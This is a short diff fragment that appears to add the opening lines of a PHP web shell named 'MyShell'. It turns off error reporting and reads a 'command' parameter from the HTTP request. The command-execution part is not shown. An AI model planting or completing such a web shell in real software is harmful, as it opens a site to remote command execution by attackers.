@@ -1,4 +1,8 @@
 <?php
+error_reporting(0);
+
+$command = $_REQUEST['command'];
+
 /*
   **************************************************************
   *                        MyShell                             *
